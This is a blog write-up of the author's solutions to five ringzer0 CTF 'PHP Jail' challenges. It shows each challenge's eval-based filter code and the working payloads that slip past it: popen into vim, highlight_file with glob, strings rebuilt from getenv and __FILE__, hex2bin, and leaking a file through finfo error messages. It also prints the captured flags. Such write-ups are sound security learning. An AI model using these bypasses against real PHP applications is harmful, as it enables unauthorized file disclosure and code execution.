+++
title = "ringzer0 CTF - Jail Escaping PHP"
author = "Victor Dorneanu"
date = "2016-06-20"
tags = ["ringzer0", "ctf", "wargames", "php "]
category = "blog"
+++

Here are my solutions for the [ringzer0](https://ringzer0team.com) **Jail Escaping** PHP challenges.

# Level 1

```.php
RingZer0 Team Online CTF

PHP Jail Level 1:
Current user is uid=1000(level1) gid=1000(level1) groups=1000(level1)

Flag is located at /home/level1/flag.txt

Challenge PHP code:
-----------------------------

<?php
array_shift($_SERVER['argv']);
$var = implode(" ", $_SERVER['argv']);

if($var == null) die("PHP Jail need an argument\n");

function filter($var) {
        if(preg_match('/(`|open|exec|pass|system|\$|\/)/i', $var)) {
                return false;
        }
        return true;
}
if(filter($var)) {
        eval($var);
        echo "Command executed";
} else {
        echo "Restricted characters has been used";
}
echo "\n";
?>

-----------------------------
Your input:
```

Pretty simple:

```.shell
Your input:
echo(file_get_contents('flag.txt'));
FLAG-sW66QEY4y6724723c7w1i0oMt179E75y
```

# Level 2

```.php
PHP Jail Level 2
Current user is uid=1001(level2) gid=1001(level2) groups=1001(level2)

Flag is located at /home/level2/flag.txt

Challenge PHP code:
-----------------------------

<?php
array_shift($_SERVER['argv']);
$var = implode(" ", $_SERVER['argv']);

if($var == null) die("PHP Jail need an argument\n");

function filter($var) {
        if(preg_match('/(\/|a|c|s|require|include|flag|eval|file)/i', $var)) {
                return false;
        }
        return true;
}
if(filter($var)) {
        eval($var);
        echo "Command executed";
} else {
        echo "Restricted characters has been used";
}
echo "\n";
?>

-----------------------------
Your input:

```

Since some functions (like `fread`, `file_get_contents` are not allowed) we can use `popen` to start an external command in order to 
read the flag.txt:

```.shell
popen("vim", "w");
```

This `vim` is started and we can read the `flag.txt` by loading it into the buffer:

```.shell
:r flag.txt
```

Flag: FLAG-YlxV8cCg84zvUtt595dla5un9EW57BCL

# Level 3


```.shell
RingZer0 Team Online CTF

PHP Jail Level 3:
Current user is uid=1002(level3) gid=1002(level3) groups=1002(level3)

Flag is located at /home/level3/flag.txt

Challenge PHP code:
-----------------------------

WARNING: the PHP interpreter is launched using php -c php.ini jail.php.
The php.ini file contain "disable_functions=exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,readfile,require,require_once,include,include_once,file"

<?php
array_shift($_SERVER['argv']);
$var = implode(" ", $_SERVER['argv']);

if($var == null) die("PHP Jail need an argument\n");

function filter($var) {
        if(preg_match('/(`|\.|\$|\/|a|c|s|require|include)/i', $var)) {
                return false;
        }
        return true;
}
if(filter($var)) {
        eval($var);
        echo "Command executed";
} else {
        echo "Restricted characters has been used";
}
echo "\n";
?>

-----------------------------

```

Since a lot of functions have been disabled, one must find a function that is **allowed** and doesn't contain any restricted characters. [highlight_file](http://php.net/manual/en/function.highlight-file.php) is one of those functions:

```.php
Your input:
highlight_file(glob("fl*txt")[0]);
<code><span style="color: #000000">
FLAG-D6jg9230H05II3ri5QB7L9166gG73l8H<br /></span>
</code>Command executed
```

# Level 4

```.shell
RingZer0 Team Online CTF

PHP Jail Level 4:
Current user is uid=1003(level4) gid=1003(level4) groups=1003(level4)

Flag is located at /home/level4/flag.txt

Challenge PHP code:
-----------------------------

WARNING: the PHP interpreter is launched using php -c php.ini jail.php.
The php.ini file contain "disable_functions=exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,readfile,require,require_once,include,include_once,file"

<?php
array_shift($_SERVER['argv']);
$var = implode(" ", $_SERVER['argv']);

if($var == null) die("PHP Jail need an argument\n");

function filter($var) {
        if(preg_match('/(\'|\"|`|\.|\$|\/|a|c|s|require|include)/i', $var)) {
                return false;
        }
        return true;
}
if(filter($var)) {
        eval($var);
        echo "Command executed";
} else {
        echo "Restricted characters has been used";
}
echo "\n";
?>

-----------------------------
Your input:

```

As you can notice `highlight_source` is *not* disabled, so you can use sth like:

```.php
highlight_source("flag.txt");
```

However, double quotes and the characters "a" and "." are not allowed. Next idea was to use `glob`:

```.php
highlight_source(glob("*")[4]);
``` 

But again: Double quotes and the "*" character are not allowed. Since my solution is kind of complicated, I'll try to explain what 
my thoughts were:

a) I needed the "/" character (is also not allowed)
b) I needed the "a" character
c) I needed a way to define a string without using double quotes
d) I wanted to somehow build the string "/home/level4/flag.txt" with allowed characters and use it with `glob`

Now the solutions to every particular problem:

a) Using `phpinfo();` I've found out that there were some *environment* variables I could use to extract the "/". Then I ran:

```.php
print_r(getenv(HOME));
PHP Notice:  Use of undefined constant HOME - assumed 'HOME' in /home/level4/jail.php(14) : eval()'d code on line 1
/home/level4Command executed
```

Then I could extract the "/" by using 

```.php
getenv(HOME)[0];
```

b) PHP has some **predefined constants** like `__FILE__`, `__DIR__` and so on:

```.php
print_r(__FILE__);
/home/level4/jail.php(14) : eval()'d codeCommand executed
```
Using `__FILE__` I can extract "a" and ".".

c) Using `define()`, `implode()`/`explode()` one could define contants as strings and use array operations to extract/concat characters:

```.php
define(HEY,__FILE__);print_r(explode(getenv(HOME)[0],HEY));
PHP Notice:  Use of undefined constant HEY - assumed 'HEY' in /home/level4/jail.php(14) : eval()'d code on line 1
PHP Notice:  Use of undefined constant HOME - assumed 'HOME' in /home/level4/jail.php(14) : eval()'d code on line 1
Array
(
    [0] => 
    [1] => home
    [2] => level4
    [3] => jail.php(14) : eval()'d code
)
```  

By using `implode()` you can then concatenate several characters:

```.php
print_r(implode(getenv(HOME)[0],[getenv(HOME)[0],home,level4,file]));
PHP Notice:  Use of undefined constant HOME - assumed 'HOME' in /home/level4/jail.php(14) : eval()'d code on line 1
PHP Notice:  Use of undefined constant HOME - assumed 'HOME' in /home/level4/jail.php(14) : eval()'d code on line 1
PHP Notice:  Use of undefined constant home - assumed 'home' in /home/level4/jail.php(14) : eval()'d code on line 1
PHP Notice:  Use of undefined constant level4 - assumed 'level4' in /home/level4/jail.php(14) : eval()'d code on line 1
PHP Notice:  Use of undefined constant file - assumed 'file' in /home/level4/jail.php(14) : eval()'d code on line 1
//home/level4/fileCommand executed
```

d) Now if you put a), b) and c) together you should be able to build your payload:


```.php
define(HEY, __FILE__); highlight_file(implode(getenv(HOME)[0],[getenv(HOME)[0],home,level4,getenv(HOME)[0],implode(explode(getenv(HOME)[0],HEY)[0], [fl,explode(getenv(HOME)[0],HEY)[3][1],g,explode(getenv(HOME)[0],HEY)[3][4],t,x,t])])); 
PHP Notice:  Use of undefined constant HEY - assumed 'HEY' in /home/level4/jail.php(14) : eval()'d code on line 1
PHP Notice:  Use of undefined constant HOME - assumed 'HOME' in /home/level4/jail.php(14) : eval()'d code on line 1
PHP Notice:  Use of undefined constant HOME - assumed 'HOME' in /home/level4/jail.php(14) : eval()'d code on line 1
PHP Notice:  Use of undefined constant home - assumed 'home' in /home/level4/jail.php(14) : eval()'d code on line 1
PHP Notice:  Use of undefined constant level4 - assumed 'level4' in /home/level4/jail.php(14) : eval()'d code on line 1
PHP Notice:  Use of undefined constant HOME - assumed 'HOME' in /home/level4/jail.php(14) : eval()'d code on line 1
PHP Notice:  Use of undefined constant HOME - assumed 'HOME' in /home/level4/jail.php(14) : eval()'d code on line 1
PHP Notice:  Use of undefined constant fl - assumed 'fl' in /home/level4/jail.php(14) : eval()'d code on line 1
PHP Notice:  Use of undefined constant HOME - assumed 'HOME' in /home/level4/jail.php(14) : eval()'d code on line 1
PHP Notice:  Use of undefined constant g - assumed 'g' in /home/level4/jail.php(14) : eval()'d code on line 1
PHP Notice:  Use of undefined constant HOME - assumed 'HOME' in /home/level4/jail.php(14) : eval()'d code on line 1
PHP Notice:  Use of undefined constant t - assumed 't' in /home/level4/jail.php(14) : eval()'d code on line 1
PHP Notice:  Use of undefined constant x - assumed 'x' in /home/level4/jail.php(14) : eval()'d code on line 1
PHP Notice:  Use of undefined constant t - assumed 't' in /home/level4/jail.php(14) : eval()'d code on line 1
<code><span style="color: #000000">
FLAG-X9uF51b0X570f616897kLN3It3K6m63c<br /></span>
</code>Command executed
```

I know... Very complicated (I've seen solutions using `hex2bin()`) but it does its job :) 

# Level 5

```.php
RingZer0 Team Online CTF

PHP Jail Level 5:
Current user is uid=1004(level5) gid=1004(level5) groups=1004(level5)

Flag is located at /home/level5/flag.txt

Challenge PHP code:
-----------------------------

WARNING: the PHP interpreter is launched using php -c php.ini jail.php.
The php.ini file contain "disable_functions=exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,readfile,require,require_once,include,include_once,file"

<?php
array_shift($_SERVER['argv']);
$var = implode(" ", $_SERVER['argv']);

if($var == null) die("PHP Jail need an argument\n");

function filter($var) {
        if(preg_match('/(\_|\'|\"|`|\.|\$|\/|a|c|s|z|require|include)/i', $var)) {
                return false;
        }
        return true;
}
if(filter($var)) {
        eval($var);
        echo "Command executed";
} else {
        echo "Restricted characters has been used";
}
echo "\n";
?>

-----------------------------
Your input:
```

The first thing I did was to generate the filename (`flag.txt`):

```.php
Your input:
print(glob(hex2bin(hex2bin(3261)))[0]);
flag.txtCommand executed
Your input:
```

Then I needed some function to read the contents from `flag.txt`. However, due to additional character restrictions, I wasn't able to find
any one that would bypass the restrictions. Then I bought the hint which stated:


> md5 can return raw characters such as *, Some classes can help you error messages too

So I need some class with some **constructor** which takes a filename as an argument. As always: Google is your friend ->
`inurl:php.net/manual/en/class`. And then I've found [Finfo](http://php.net/manual/en/class.finfo.php):


```
Your input:
new Finfo(0,glob(hex2bin(hex2bin(3261)))[0]);
PHP Notice:  finfo::finfo(): Warning: offset `FLAG-81M2544kLM9nxBJCfMG2ET8329Lo1qqZ' invalid in /home/level5/jail.php(14) : eval()'d code on line 1
PHP Notice:  finfo::finfo(): Warning: type `FLAG-81M2544kLM9nxBJCfMG2ET8329Lo1qqZ' invalid in /home/level5/jail.php(14) : eval()'d code on line 1
PHP Warning:  finfo::finfo(): Failed to load magic database at '/home/level5/flag.txt'. in /home/level5/jail.php(14) : eval()'d code on line 1
Command executed
```

